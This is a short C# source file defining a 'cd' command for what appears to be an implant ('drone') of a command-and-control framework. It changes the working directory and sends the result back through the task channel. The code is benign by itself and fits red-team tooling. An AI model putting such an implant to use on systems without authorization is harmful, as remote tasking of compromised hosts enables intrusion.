using System;
using System.IO;

using Drone.Models;

namespace Drone.Functions;

public class ChangeDirectory : DroneFunction
{
    public override string Name => "cd";
    
    public override void Execute(DroneTask task)
    {
        var path = task.Parameters.Length == 0
            ? Environment.GetFolderPath(Environment.SpecialFolder.Personal)
            : task.Parameters[0];
        
        Directory.SetCurrentDirectory(path);
        Drone.SendOutput(task.TaskId, Directory.GetCurrentDirectory());
    }
}